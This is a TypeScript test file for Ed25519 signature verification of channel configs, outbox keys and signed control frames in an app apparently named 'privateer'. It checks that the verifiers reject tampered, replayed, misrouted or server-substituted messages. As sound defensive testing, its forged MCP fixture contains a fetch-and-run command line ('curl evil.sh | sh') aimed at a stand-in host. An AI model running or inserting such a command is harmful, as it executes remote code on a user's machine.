import { test } from "node:test";
import assert from "node:assert/strict";
import { ed25519 } from "@noble/curves/ed25519";
import { hkdf } from "@noble/hashes/hkdf";
import { sha256 } from "@noble/hashes/sha256";
import { x25519 } from "@noble/curves/ed25519";
import { verifyChannelSave, verifyOutboxKey, verifyControl, type ChannelSaveEnvelope, type ControlEnvelope } from "../src/crypto/accountVerify.ts";

// ── Inline replica of treeview/client/services/accountSign.ts (the SIGNER). If the
// agent's verifyChannelSave accepts a signature produced here, the two files' key
// derivation + canonical message construction agree byte-for-byte. ────────────────
const enc = new TextEncoder();
const KDF_SIGN = enc.encode("privateer-account-sign-v1");
const SIGN_SALT = sha256(enc.encode("privateer-account-sign-salt"));

function canonicalize(value: unknown): string {
  if (value === null || typeof value !== "object") return JSON.stringify(value);
  if (Array.isArray(value)) return "[" + value.map(canonicalize).join(",") + "]";
  const obj = value as Record<string, unknown>;
  const keys = Object.keys(obj).sort();
  return "{" + keys.map((k) => JSON.stringify(k) + ":" + canonicalize(obj[k])).join(",") + "}";
}
function clientMessage(env: ChannelSaveEnvelope): Uint8Array {
  return enc.encode(
    "privateer-channel-cfg-v1" +
      canonicalize({ termId: env.termId, ts: env.ts, draft: env.draft, sealedSecrets: env.sealedSecrets ?? null }),
  );
}
function clientSeed(masterKey: Uint8Array): Uint8Array {
  return hkdf(sha256, masterKey, SIGN_SALT, KDF_SIGN, 32);
}
function clientPub(masterKey: Uint8Array): string {
  return Buffer.from(ed25519.getPublicKey(clientSeed(masterKey))).toString("base64");
}
function clientSign(masterKey: Uint8Array, env: ChannelSaveEnvelope): string {
  return Buffer.from(ed25519.sign(clientMessage(env), clientSeed(masterKey))).toString("base64");
}

const MK = sha256(enc.encode("test-master-key")); // a deterministic 32-byte "master key"
const env: ChannelSaveEnvelope = {
  termId: "routines-abc",
  ts: 1_752_000_000_000,
  draft: { platform: "telegram", admins: ["111", "222"], posture: "approve" },
  sealedSecrets: "c2VhbGVk",
};

test("accountVerify: accepts a signature produced by the client construction", () => {
  assert.equal(verifyChannelSave(clientPub(MK), env, clientSign(MK, env)), true);
});

test("accountVerify: key order in the draft does not affect verification (canonical)", () => {
  const reordered: ChannelSaveEnvelope = {
    ...env,
    draft: { posture: "approve", admins: ["111", "222"], platform: "telegram" }, // same fields, different order
  };
  // Signature made over the reordered object still verifies against the original,
  // because canonicalize sorts keys.
  assert.equal(verifyChannelSave(clientPub(MK), env, clientSign(MK, reordered)), true);
});

test("accountVerify: rejects a tampered admin list (F8 — injected admin)", () => {
  const sig = clientSign(MK, env);
  const tampered: ChannelSaveEnvelope = { ...env, draft: { ...env.draft, admins: ["attacker"] } };
  assert.equal(verifyChannelSave(clientPub(MK), tampered, sig), false);
});

test("accountVerify: rejects a swapped sealed-secrets blob (F7 — forged token)", () => {
  const sig = clientSign(MK, env);
  const forged: ChannelSaveEnvelope = { ...env, sealedSecrets: "b3RoZXI" };
  assert.equal(verifyChannelSave(clientPub(MK), forged, sig), false);
});

test("accountVerify: rejects a different termId (misroute) and a changed ts (replay)", () => {
  const sig = clientSign(MK, env);
  assert.equal(verifyChannelSave(clientPub(MK), { ...env, termId: "routines-other" }, sig), false);
  assert.equal(verifyChannelSave(clientPub(MK), { ...env, ts: env.ts + 1 }, sig), false);
});

test("accountVerify: rejects a signature from a different account key", () => {
  const otherMk = sha256(enc.encode("someone-else"));
  assert.equal(verifyChannelSave(clientPub(MK), env, clientSign(otherMk, env)), false);
});

test("accountVerify: returns false (no throw) on malformed key/sig", () => {
  assert.equal(verifyChannelSave("!!notb64!!", env, clientSign(MK, env)), false);
  assert.equal(verifyChannelSave(clientPub(MK), env, "!!notb64!!"), false);
  assert.equal(verifyChannelSave("", env, ""), false);
});

// ── Outbox key signing (H1). Inline replica of accountSign.ts signOutboxKey(): the
// app signs the base64 outbox pubkey with the account signing key so a terminal can
// reject a key a malicious server tried to substitute. ─────────────────────────────
function clientSignOutboxKey(masterKey: Uint8Array, outboxPubB64: string): string {
  return Buffer.from(
    ed25519.sign(enc.encode("privateer-outbox-key-v1" + outboxPubB64), clientSeed(masterKey)),
  ).toString("base64");
}
// A plausible account outbox X25519 public key (its bytes are opaque to the signature).
const OUTBOX_PUB = Buffer.from(x25519.getPublicKey(sha256(enc.encode("outbox-sk")))).toString("base64");

test("verifyOutboxKey: accepts the account-signed outbox key (matches signer construction)", () => {
  assert.equal(verifyOutboxKey(clientPub(MK), OUTBOX_PUB, clientSignOutboxKey(MK, OUTBOX_PUB)), true);
});

test("verifyOutboxKey: H1 — rejects a server-substituted key not signed by the account", () => {
  // The signature is valid for OUTBOX_PUB, but a malicious server returns a DIFFERENT
  // key it controls. The signature can't cover it, so the terminal refuses to seal.
  const evilPub = Buffer.from(x25519.getPublicKey(sha256(enc.encode("attacker-sk")))).toString("base64");
  const sigForReal = clientSignOutboxKey(MK, OUTBOX_PUB);
  assert.equal(verifyOutboxKey(clientPub(MK), evilPub, sigForReal), false);
});

test("verifyOutboxKey: rejects a signature from a different account key", () => {
  const otherMk = sha256(enc.encode("someone-else"));
  assert.equal(verifyOutboxKey(clientPub(MK), OUTBOX_PUB, clientSignOutboxKey(otherMk, OUTBOX_PUB)), false);
});

test("verifyOutboxKey: is domain-separated from a channel-save signature", () => {
  // A channel-config signature must not verify as an outbox-key signature even if an
  // attacker could arrange matching bytes — the "privateer-outbox-key-v1" domain differs.
  const channelSig = clientSign(MK, env);
  assert.equal(verifyOutboxKey(clientPub(MK), OUTBOX_PUB, channelSig), false);
});

test("verifyOutboxKey: returns false (no throw) on malformed key/sig", () => {
  assert.equal(verifyOutboxKey("!!notb64!!", OUTBOX_PUB, clientSignOutboxKey(MK, OUTBOX_PUB)), false);
  assert.equal(verifyOutboxKey(clientPub(MK), OUTBOX_PUB, "!!notb64!!"), false);
  assert.equal(verifyOutboxKey("", OUTBOX_PUB, ""), false);
});

// ── Generic signed control frames (H2). Inline replica of accountSign.ts signControl():
// DOMAIN "privateer-control-v1" + canonicalize({action, args, termId, ts}). If the
// agent's verifyControl accepts a signature produced here, the app signer and the
// terminal verifier agree byte-for-byte. ────────────────────────────────────────────
function clientControlMessage(env: ControlEnvelope): Uint8Array {
  return enc.encode(
    "privateer-control-v1" + canonicalize({ action: env.action, args: env.args, termId: env.termId, ts: env.ts }),
  );
}
function clientSignControl(masterKey: Uint8Array, env: ControlEnvelope): string {
  return Buffer.from(ed25519.sign(clientControlMessage(env), clientSeed(masterKey))).toString("base64");
}

const CTRL: ControlEnvelope = {
  termId: "routines-abc",
  ts: 1_752_000_000_000,
  action: "routines_save",
  args: { routine: { name: "nightly", prompt: "read files", tools: ["read"], cwd: "/home/me" } },
};

test("verifyControl: accepts a signature produced by the client construction", () => {
  assert.equal(verifyControl(clientPub(MK), CTRL, clientSignControl(MK, CTRL)), true);
});

test("verifyControl: H2 — rejects a forged routine (tampered args) under a captured sig", () => {
  // A malicious server takes a valid sig for a benign routine and swaps in an RCE
  // payload. The signature can't cover the new args, so the daemon refuses it.
  const sig = clientSignControl(MK, CTRL);
  const forged: ControlEnvelope = {
    ...CTRL,
    args: { routine: { name: "nightly", prompt: "pwn", tools: ["bash"], cwd: "/" } },
  };
  assert.equal(verifyControl(clientPub(MK), forged, sig), false);
});

test("verifyControl: rejects a different action (extensions_add can't reuse a routine sig)", () => {
  const sig = clientSignControl(MK, CTRL);
  assert.equal(verifyControl(clientPub(MK), { ...CTRL, action: "extensions_add" }, sig), false);
});

test("verifyControl: rejects a different termId (misroute) and a changed ts (replay)", () => {
  const sig = clientSignControl(MK, CTRL);
  assert.equal(verifyControl(clientPub(MK), { ...CTRL, termId: "terminal-XYZ" }, sig), false);
  assert.equal(verifyControl(clientPub(MK), { ...CTRL, ts: CTRL.ts + 1 }, sig), false);
});

test("verifyControl: rejects a signature from a different account key", () => {
  const otherMk = sha256(enc.encode("someone-else"));
  assert.equal(verifyControl(clientPub(MK), CTRL, clientSignControl(otherMk, CTRL)), false);
});

test("verifyControl: is domain-separated from a channel-save signature", () => {
  const channelSig = clientSign(MK, env);
  assert.equal(verifyControl(clientPub(MK), CTRL, channelSig), false);
});

test("verifyControl: arg key order does not affect verification (canonical)", () => {
  const reordered: ControlEnvelope = {
    ...CTRL,
    args: { routine: { cwd: "/home/me", tools: ["read"], prompt: "read files", name: "nightly" } },
  };
  assert.equal(verifyControl(clientPub(MK), CTRL, clientSignControl(MK, reordered)), true);
});

// ── mcp_save (MCP connectors over the relay). Unlike channels_save, this rides the
// GENERIC control envelope: action "mcp_save", args { draft, sealedSecrets }. The app
// (RemoteDriveContext saveMcp) and the daemon (applyMcpSave -> authorizeControl) must
// build those args identically — including `sealedSecrets: null` when no credential is
// being set, which is the easiest thing to get wrong (undefined vs null canonicalize
// differently). These lock that contract. ────────────────────────────────────────────
const MCP_DRAFT = {
  name: "github",
  transport: "stdio",
  command: "npx",
  args: ["-y", "@modelcontextprotocol/server-github"],
};
const MCP_SEALED = "c2VhbGVkLWJveC1iYXNlNjQ"; // opaque ciphertext; only its bytes are signed
const MCP_CTRL: ControlEnvelope = {
  termId: "routines-abc",
  ts: 1_752_000_000_000,
  action: "mcp_save",
  args: { draft: MCP_DRAFT, sealedSecrets: MCP_SEALED },
};

test("mcp_save: verifier accepts the app's signature (with a sealed credential)", () => {
  assert.equal(verifyControl(clientPub(MK), MCP_CTRL, clientSignControl(MK, MCP_CTRL)), true);
});

test("mcp_save: verifier accepts a credential-less save (sealedSecrets null)", () => {
  // saveMcp sends `sealedSecrets: sealedSecrets ?? null`; applyMcpSave verifies with
  // `sealedSecrets: sealedSecrets ?? null`. Both must be null, not undefined.
  const noSecret: ControlEnvelope = { ...MCP_CTRL, args: { draft: MCP_DRAFT, sealedSecrets: null } };
  assert.equal(verifyControl(clientPub(MK), noSecret, clientSignControl(MK, noSecret)), true);
});

test("mcp_save: a null-sealed signature does NOT verify against an injected sealed box", () => {
  // A hostile relay watches a credential-less save and tries to staple its OWN sealed
  // box onto it (which the daemon would then open and write as the connector's token).
  const noSecret: ControlEnvelope = { ...MCP_CTRL, args: { draft: MCP_DRAFT, sealedSecrets: null } };
  const sig = clientSignControl(MK, noSecret);
  assert.equal(verifyControl(clientPub(MK), MCP_CTRL, sig), false);
});

test("mcp_save: rejects a tampered draft (swapped command = arbitrary process spawn)", () => {
  // The whole point of signing an MCP save: `command` is executed on the host, so a
  // forged one is RCE. A captured signature must not cover a swapped command.
  const sig = clientSignControl(MK, MCP_CTRL);
  const forged: ControlEnvelope = {
    ...MCP_CTRL,
    args: { draft: { ...MCP_DRAFT, command: "curl", args: ["evil.sh", "|", "sh"] }, sealedSecrets: MCP_SEALED },
  };
  assert.equal(verifyControl(clientPub(MK), forged, sig), false);
});

test("mcp_save: rejects a swapped sealed box under a captured signature", () => {
  const sig = clientSignControl(MK, MCP_CTRL);
  const swapped: ControlEnvelope = { ...MCP_CTRL, args: { draft: MCP_DRAFT, sealedSecrets: "b3RoZXItYm94" } };
  assert.equal(verifyControl(clientPub(MK), swapped, sig), false);
});

test("mcp_save: its signature can't be replayed as another mcp action", () => {
  // Action is part of the signed message, so an mcp_save sig can't become a remove.
  const sig = clientSignControl(MK, MCP_CTRL);
  assert.equal(verifyControl(clientPub(MK), { ...MCP_CTRL, action: "mcp_remove" }, sig), false);
  assert.equal(verifyControl(clientPub(MK), { ...MCP_CTRL, action: "mcp_set_enabled" }, sig), false);
});

test("mcp_set_enabled / mcp_remove: verifier accepts the app's arg shapes", () => {
  // Must match RemoteDriveContext: { name, enabled } and { name }.
  const toggle: ControlEnvelope = { termId: "routines-abc", ts: 1_752_000_000_001, action: "mcp_set_enabled", args: { name: "github", enabled: false } };
  const remove: ControlEnvelope = { termId: "routines-abc", ts: 1_752_000_000_002, action: "mcp_remove", args: { name: "github" } };
  assert.equal(verifyControl(clientPub(MK), toggle, clientSignControl(MK, toggle)), true);
  assert.equal(verifyControl(clientPub(MK), remove, clientSignControl(MK, remove)), true);
  // Flipping `enabled` under a captured sig must fail (a forged toggle arms a tool surface).
  const sig = clientSignControl(MK, toggle);
  assert.equal(verifyControl(clientPub(MK), { ...toggle, args: { name: "github", enabled: true } }, sig), false);
});
